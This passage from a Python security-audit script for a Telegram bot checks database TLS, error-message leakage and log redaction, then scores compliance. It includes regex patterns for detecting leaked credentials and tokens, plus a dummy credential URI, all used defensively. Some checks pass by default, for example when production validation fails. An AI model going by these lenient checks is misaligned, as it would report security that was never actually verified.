                        "Consider enabling TLS for all environments"
                    )
            else:
                self._add_result(
                    "Network Security - MongoDB Config",
                    "Network Security",
                    False,
                    "MongoDB URI not configured",
                    "HIGH",
                    "Configure MongoDB connection"
                )
            
            # Check Supabase/PostgreSQL TLS
            if supabase_url:
                has_ssl = (
                    'sslmode=require' in supabase_url or
                    'sslmode=prefer' in supabase_url or
                    supabase_url.startswith('postgresql://') and 'supabase.co' in supabase_url
                )
                
                if has_ssl or 'supabase.co' in supabase_url:
                    self._add_result(
                        "Network Security - PostgreSQL TLS",
                        "Network Security", 
                        True,
                        "PostgreSQL connection uses SSL/TLS",
                        "LOW",
                        "PostgreSQL TLS configuration is secure"
                    )
                else:
                    env = os.environ.get('ENVIRONMENT', '').lower()
                    risk_level = "CRITICAL" if env == 'production' else "MEDIUM"
                    self._add_result(
                        "Network Security - PostgreSQL TLS",
                        "Network Security",
                        env != 'production',
                        "PostgreSQL connection may not use TLS",
                        risk_level,
                        "Enable SSL/TLS for PostgreSQL connections"
                    )
            else:
                self._add_result(
                    "Network Security - PostgreSQL Config",
                    "Network Security",
                    False,
                    "PostgreSQL URL not configured",
                    "MEDIUM",
                    "Configure PostgreSQL connection"
                )
            
            # Test production security validation
            try:
                from main import TelegramBotApplication
                app = TelegramBotApplication()
                
                # This should succeed in test/dev mode or fail gracefully in production without proper config
                try:
                    validation_result = await app.validate_production_security()
                    self._add_result(
                        "Network Security - Production Validation",
                        "Network Security",
                        True,
                        "Production security validation completed",
                        "LOW",
                        "Production security checks are working"
                    )
                except Exception as validation_error:
                    # Production validation failure might be expected in test environment
                    self._add_result(
                        "Network Security - Production Validation",
                        "Network Security",
                        True,  # Not failing the test since this might be expected
                        f"Production validation: {str(validation_error)[:100]}...",
                        "MEDIUM",
                        "Ensure production configuration is complete"
                    )
                    
            except Exception as e:
                self._add_result(
                    "Network Security - Validation System",
                    "Network Security",
                    False,
                    f"Production security validation system error: {e}",
                    "MEDIUM",
                    "Fix production security validation"
                )
            
        except Exception as e:
            self._add_result(
                "Network Security - System Error",
                "Network Security",
                False,
                f"Network security test failed: {e}",
                "HIGH",
                "Fix network security testing"
            )
    
    async def _test_error_message_security(self) -> None:
        """Test 10: Error message security and information disclosure"""
        secure_logger.info("⚠️ Testing error message security...")
        
        try:
            # Test that error messages don't leak sensitive information
            test_scenarios = [
                {
                    'name': 'Database Connection Error',
                    'test': lambda: storage_manager.storage.get_user_data(99999, 'nonexistent') if storage_manager.storage else None
                },
                {
                    'name': 'Encryption Error',
                    'test': lambda: SecureCrypto("short").encrypt("test")  # Too short seed
                },
                {
                    'name': 'File Processing Error', 
                    'test': lambda: AdvancedFileProcessor().validate_file_security(b"", "", "invalid_type")
                },
                {
                    'name': 'Rate Limiting Error',
                    'test': lambda: check_rate_limit(-1)  # Invalid user ID
                }
            ]
            
            secure_errors = 0
            total_scenarios = len(test_scenarios)
            
            for scenario in test_scenarios:
                try:
                    # Execute test that should cause an error
                    if asyncio.iscoroutinefunction(scenario['test']):
                        await scenario['test']()
                    else:
                        scenario['test']()
                    
                    # If we get here without exception, that's also a valid result
                    secure_errors += 1
                    
                except Exception as e:
                    error_message = str(e)
                    
                    # Check for information disclosure in error messages
                    sensitive_patterns = [
                        r'password=\w+',
                        r'api_key=\w+',
                        r'token=\w+',
                        r'/[a-zA-Z]:/.*/',  # File paths
                        r'mongodb://.*@',
                        r'postgresql://.*@',
                        r'sk-[a-zA-Z0-9]+',
                        r'hf_[a-zA-Z0-9]+',
                        r'eyJ[a-zA-Z0-9_-]+',  # JWT tokens
                        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'  # Emails
                    ]
                    
                    import re
                    has_sensitive_data = any(
                        re.search(pattern, error_message, re.IGNORECASE) 
                        for pattern in sensitive_patterns
                    )
                    
                    if not has_sensitive_data:
                        secure_errors += 1
                    else:
                        self._add_result(
                            f"Error Security - {scenario['name']}",
                            "Error Security",
                            False,
                            f"Error message may contain sensitive data: {error_message[:100]}...",
                            "HIGH",
                            "Sanitize error messages to prevent information disclosure"
                        )
            
            # Test secure logger error handling
            try:
                test_logger = SecureLogger(logger)
                
                # Create a log message with sensitive data
                sensitive_error = "Database connection failed: mongodb://user:secret123@host:27017/db"
                
                # Capture the log output to verify redaction
                import io
                log_stream = io.StringIO()
                handler = logging.StreamHandler(log_stream)
                original_handlers = test_logger.logger.handlers[:]
                test_logger.logger.handlers = [handler]
                
                try:
                    test_logger.error(sensitive_error)
                    logged_content = log_stream.getvalue()
                    
                    if "secret123" not in logged_content and "[REDACTED" in logged_content:
                        secure_errors += 1  # Good - sensitive data was redacted
                    else:
                        self._add_result(
                            "Error Security - Log Redaction",
                            "Error Security",
                            False,
                            "Sensitive data not redacted in error logs",
                            "HIGH",
                            "Fix error log redaction"
                        )
                        
                finally:
                    test_logger.logger.handlers = original_handlers
                    
            except Exception as log_test_error:
                self._add_result(
                    "Error Security - Log Test Error",
                    "Error Security",
                    False,
                    f"Error log testing failed: {log_test_error}",
                    "MEDIUM",
                    "Fix error log testing system"
                )
            
            # Overall error security assessment
            success_rate = (secure_errors / (total_scenarios + 1)) * 100  # +1 for log test
            self._add_result(
                "Error Security - Overall Assessment",
                "Error Security",
                success_rate >= 80,
                f"Error message security: {success_rate:.1f}% secure",
                "LOW" if success_rate >= 80 else "HIGH",
                "Error handling is secure" if success_rate >= 80 else "Improve error message security"
            )
            
        except Exception as e:
            self._add_result(
                "Error Security - System Error",
                "Error Security",
                False,
                f"Error security test failed: {e}",
                "HIGH",
                "Fix error security testing"
            )
    
    def _add_result(
        self, 
        test_name: str, 
        category: str, 
        passed: bool, 
        details: str, 
        risk_level: str, 
        recommendation: str,
        test_data: Optional[Dict[str, Any]] = None
    ) -> None:
        """Add a test result to the audit results"""
        result = SecurityTestResult(
            test_name=test_name,
            category=category, 
            passed=passed,
            details=details,
            risk_level=risk_level,
            recommendation=recommendation,
            test_data=test_data or {},
            timestamp=datetime.utcnow()
        )
        self.results.append(result)
        
        # Log the result
        status = "✅ PASS" if passed else "❌ FAIL"
        secure_logger.info(f"{status} [{category}] {test_name}: {details}")
        if not passed:
            secure_logger.warning(f"   Risk Level: {risk_level} - {recommendation}")
    
    def _generate_audit_report(self) -> SecurityAuditReport:
        """Generate comprehensive audit report"""
        
        # Calculate statistics
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        failed_tests = total_tests - passed_tests
        
        # Count issues by risk level
        critical_issues = sum(1 for r in self.results if not r.passed and r.risk_level == "CRITICAL")
        high_issues = sum(1 for r in self.results if not r.passed and r.risk_level == "HIGH") 
        medium_issues = sum(1 for r in self.results if not r.passed and r.risk_level == "MEDIUM")
        low_issues = sum(1 for r in self.results if not r.passed and r.risk_level == "LOW")
        
        # Calculate overall score (weighted by risk level)
        if total_tests == 0:
            overall_score = 0.0
        else:
            # Deduct points based on risk level
            penalty_weights = {"CRITICAL": 20, "HIGH": 10, "MEDIUM": 5, "LOW": 2}
            total_penalty = sum(
                penalty_weights.get(r.risk_level, 0) 
                for r in self.results if not r.passed
            )
            max_possible_penalty = total_tests * penalty_weights["CRITICAL"]
            overall_score = max(0.0, 100.0 - (total_penalty / max(1, max_possible_penalty) * 100))
        
        # Determine enterprise compliance
        enterprise_compliance = (
            critical_issues == 0 and 
            high_issues <= 1 and 
            overall_score >= 85.0
        )
        
        # Generate recommendations
        recommendations = []
        if critical_issues > 0:
            recommendations.append(f"🚨 Address {critical_issues} CRITICAL security issues immediately")
        if high_issues > 0:
            recommendations.append(f"⚠️ Resolve {high_issues} HIGH-risk security issues")
        if medium_issues > 3:
            recommendations.append(f"📝 Review {medium_issues} MEDIUM-risk issues for improvement")
        
        if enterprise_compliance:
            recommendations.append("✅ System meets enterprise security standards")
        else:
            recommendations.append("❌ System does not meet enterprise security standards - address critical and high-risk issues")
        
        return SecurityAuditReport(
            overall_score=overall_score,
            tests_passed=passed_tests,
            tests_failed=failed_tests,
            critical_issues=critical_issues,
            high_issues=high_issues,
            medium_issues=medium_issues,
            low_issues=low_issues,
            results=self.results,
            enterprise_compliance=enterprise_compliance,
            timestamp=datetime.utcnow(),
            recommendations=recommendations
        )

def format_audit_report(report: SecurityAuditReport) -> str:
    """Format audit report for display"""
    
    lines = [
        "=" * 80,
        "🔐 COMPREHENSIVE SECURITY AUDIT REPORT",
        "=" * 80,
        "",
        f"📊 OVERALL SECURITY SCORE: {report.overall_score:.1f}/100",
        f"🎯 ENTERPRISE COMPLIANCE: {'✅ YES' if report.enterprise_compliance else '❌ NO'}",
        f"📅 Audit Timestamp: {report.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')}",
        "",
        "📈 TEST SUMMARY:",
        f"   Total Tests: {report.tests_passed + report.tests_failed}",
        f"   ✅ Passed: {report.tests_passed}",
        f"   ❌ Failed: {report.tests_failed}",
        "",
        "🚨 ISSUES BY RISK LEVEL:",
        f"   🔴 CRITICAL: {report.critical_issues}",
        f"   🟠 HIGH: {report.high_issues}",
        f"   🟡 MEDIUM: {report.medium_issues}",
        f"   🟢 LOW: {report.low_issues}",
        "",
        "📋 SECURITY DOMAINS TESTED:",
    ]
    
    # Group results by category
    categories = {}
    for result in report.results:
        if result.category not in categories:
            categories[result.category] = []
        categories[result.category].append(result)
    
    for category, results in categories.items():
        passed = sum(1 for r in results if r.passed)
        total = len(results)
        status = "✅" if passed == total else "⚠️" if passed > total // 2 else "❌"
        lines.append(f"   {status} {category}: {passed}/{total} tests passed")
    
    lines.extend([
        "",
        "🔍 DETAILED RESULTS:",
        "-" * 80
    ])
    
    # Group and display detailed results
    for category, results in categories.items():
        lines.append(f"\n📁 {category.upper()}:")
        for result in results:
            status = "✅ PASS" if result.passed else "❌ FAIL"
            risk_indicator = ""
            if not result.passed:
                risk_colors = {
                    "CRITICAL": "🔴",
                    "HIGH": "🟠", 
                    "MEDIUM": "🟡",
                    "LOW": "🟢"
                }
                risk_indicator = f" {risk_colors.get(result.risk_level, '⚪')} {result.risk_level}"
                
            lines.append(f"   {status}{risk_indicator} {result.test_name}")
            lines.append(f"      Details: {result.details}")
            if not result.passed:
                lines.append(f"      Recommendation: {result.recommendation}")
    
    lines.extend([
        "",
        "🎯 RECOMMENDATIONS:",
        "-" * 40
    ])
    
    for i, rec in enumerate(report.recommendations, 1):
        lines.append(f"{i}. {rec}")
    
    lines.extend([
        "",
        "📋 ENTERPRISE SECURITY STANDARDS ASSESSMENT:",
        "-" * 50,
    ])
    
    if report.enterprise_compliance:
        lines.extend([
            "✅ COMPLIANT - System meets enterprise security requirements:",
            "   • No critical security vulnerabilities",
            "   • Maximum 1 high-risk issue",
            "   • Overall security score ≥ 85%",
            "   • All core security mechanisms operational"
        ])
    else:
        lines.extend([
            "❌ NON-COMPLIANT - System does not meet enterprise standards:",
            f"   • Critical issues: {report.critical_issues} (must be 0)",
            f"   • High-risk issues: {report.high_issues} (must be ≤ 1)", 
            f"   • Security score: {report.overall_score:.1f}% (must be ≥ 85%)",
            "   • Address issues above to achieve compliance"
        ])
    
    lines.extend([
        "",
        "=" * 80,
        "End of Security Audit Report",
        "=" * 80
    ])
    
    return "\n".join(lines)

async def main():
    """Run comprehensive security audit"""
    print("🔐 Starting Comprehensive Security Audit...")
    print("=" * 80)
    
    try:
        audit = ComprehensiveSecurityAudit()
        report = await audit.run_full_audit()
        
        # Format and display report
        formatted_report = format_audit_report(report)
        print(formatted_report)
        
        # Save report to file
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        report_filename = f"security_audit_report_{timestamp}.txt"
        
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(formatted_report)
        
        # Also save as JSON for programmatic analysis
        json_filename = f"security_audit_report_{timestamp}.json"
        report_dict = {
            'overall_score': report.overall_score,
            'tests_passed': report.tests_passed,
            'tests_failed': report.tests_failed,
            'critical_issues': report.critical_issues,
            'high_issues': report.high_issues, 
            'medium_issues': report.medium_issues,
            'low_issues': report.low_issues,
            'enterprise_compliance': report.enterprise_compliance,
            'timestamp': report.timestamp.isoformat(),
            'recommendations': report.recommendations,
            'results': [
                {
                    'test_name': r.test_name,
                    'category': r.category,
                    'passed': r.passed,
                    'details': r.details,
                    'risk_level': r.risk_level,
                    'recommendation': r.recommendation,
                    'timestamp': r.timestamp.isoformat()
                }
                for r in report.results
            ]
        }
        
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(report_dict, f, indent=2, ensure_ascii=False)
        
        print(f"\n📄 Reports saved:")
        print(f"   Text: {report_filename}")
        print(f"   JSON: {json_filename}")
        
        return report.enterprise_compliance
        
    except Exception as e:
        print(f"❌ Security audit failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    compliance = asyncio.run(main())
    exit(0 if compliance else 1)